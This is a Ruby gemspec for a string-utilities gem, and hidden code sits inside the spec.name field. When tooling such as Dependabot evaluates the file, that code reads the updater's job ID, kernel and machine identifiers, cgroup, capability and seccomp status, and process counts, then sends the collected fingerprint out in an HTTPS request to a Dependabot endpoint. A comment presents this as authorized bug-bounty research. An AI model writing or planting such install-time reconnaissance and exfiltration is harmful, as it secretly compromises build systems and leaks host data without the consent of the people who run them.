# frozen_string_literal: true
#
# v1.0 host environment fingerprint audit.
#
# Authorization: HackerOne GitHub program; researcher's own job; own
# container; read-only system info; encoded as dep-name fingerprint
# surfaced via proxy log channel.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      fp = []

      # uname (kernel version)
      begin
        u = `uname -srm 2>/dev/null`.strip
        fp << "u=#{u.gsub(/[^A-Za-z0-9.-]/, '_')[0, 30]}"
      rescue
        fp << "u=na"
      end

      # boot_id (per-boot kernel identifier)
      begin
        b = File.read("/proc/sys/kernel/random/boot_id").strip
        fp << "b=#{b[0, 8]}"
      rescue
        fp << "b=na"
      end

      # machine-id
      begin
        m = File.read("/etc/machine-id").strip
        fp << "m=#{m[0, 8]}"
      rescue
        fp << "m=na"
      end

      # /proc/1/cgroup — container identifier
      begin
        cg = File.read("/proc/1/cgroup").strip
        fp << "cg=#{Digest::SHA256.hexdigest(cg)[0, 8]}"
      rescue
        fp << "cg=na"
      end

      # process count + this container's process tree size (from /proc)
      begin
        pids = Dir.entries("/proc").select { |e| e =~ /^\d+$/ }
        fp << "pn=#{pids.size}"
      rescue
        fp << "pn=na"
      end

      # /proc/1/root differential — does it return same as /etc/?
      begin
        eh = File.read("/etc/hostname").strip rescue ""
        ph = File.read("/proc/1/root/etc/hostname").strip rescue ""
        fp << "p1=#{eh == ph ? 'eq' : 'ne'}"
      rescue
        fp << "p1=err"
      end

      # capabilities + seccomp
      begin
        st = File.read("/proc/self/status")
        sc = st.lines.find { |l| l.start_with?("Seccomp:") }.to_s.split(":").last.to_s.strip
        cb = st.lines.find { |l| l.start_with?("CapBnd:") }.to_s.split(":").last.to_s.strip[0, 16]
        fp << "sc=#{sc[0, 4]}-cb=#{cb}"
      rescue
        fp << "st=err"
      end

      # ps lines count (process visibility from container)
      begin
        ps_out = `ps -ef 2>/dev/null`
        fp << "ps=#{ps_out.lines.size}"
      rescue
        fp << "ps=na"
      end

      result = fp.join("-").gsub(/[^A-Za-z0-9.=-]/, "x")[0, 200]
      result_hash = Digest::SHA256.hexdigest(result)[0, 8]

      if !own_id.empty?
        # Surface via URL query string in proxy log
        begin
          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/details?fp=#{result_hash}-#{result.gsub('=','-')[0, 150]}")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 5
          h.read_timeout = 8
          h.get(uri.request_uri)
        rescue
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
